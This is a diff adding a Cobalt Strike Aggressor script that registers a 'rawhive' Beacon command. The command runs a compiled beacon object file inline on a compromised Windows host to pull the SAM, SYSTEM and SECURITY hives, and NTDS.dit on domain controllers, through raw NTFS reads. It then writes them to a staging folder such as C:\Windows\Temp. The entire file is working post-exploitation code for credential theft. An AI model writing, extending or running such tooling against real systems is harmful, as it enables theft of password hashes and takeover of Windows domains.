@@ -1,0 +1,53 @@
+alias rawhive {
+    local('$bid $volume $outpath $args $handle $data');
+    $bid = $1;
+
+    if ($3 eq "") {
+        $volume  = "C";
+        $outpath = $2;
+    } else {
+        $volume  = $2;
+        $outpath = $3;
+    }
+
+    if ($outpath eq "") {
+        berror($bid, "rawhive: outdir required  e.g.  rawhive C:\\Windows\\Temp  or  rawhive C C:\\Windows\\Temp");
+        return;
+    }
+
+    if (strlen($volume) == 2 && substr($volume, 1, 1) eq ":") {
+        $volume = substr($volume, 0, 1);
+    }
+
+    if (strlen($volume) != 1) {
+        berror($bid, "rawhive: volume must be a drive letter, e.g. C");
+        return;
+    }
+
+    $handle = openf(script_resource("dist/rawhive.x64.o"));
+    if ($handle eq $null) {
+        berror($bid, "rawhive: dist/rawhive.x64.o not found or not readable; run make first");
+        return;
+    }
+    $data   = readb($handle, -1);
+    closef($handle);
+    if (strlen($data) == 0) {
+        berror($bid, "rawhive: dist/rawhive.x64.o is empty or could not be read");
+        return;
+    }
+
+    $args = bof_pack($bid, "zz", $volume, $outpath);
+
+    btask($bid, "RawHive: extracting SAM/SYSTEM/SECURITY [+NTDS on DCs] to $outpath");
+    beacon_inline_execute($bid, $data, "go", $args);
+}
+
+beacon_command_register(
+    "rawhive",
+    "Extract SAM/SYSTEM/SECURITY [+NTDS on DCs] via raw NTFS, write to disk as .tmp files",
+    "Usage: rawhive [volume] <outdir>\n" .
+    "  volume  Drive letter to read (default: C)\n" .
+    "  outdir  Target directory (e.g. C:\\Windows\\Temp)\n" .
+    "Example: rawhive d C:\\Temp  reads D: and writes output to C:\\Temp\n\n" .
+    "Requires local admin or SYSTEM."
+);
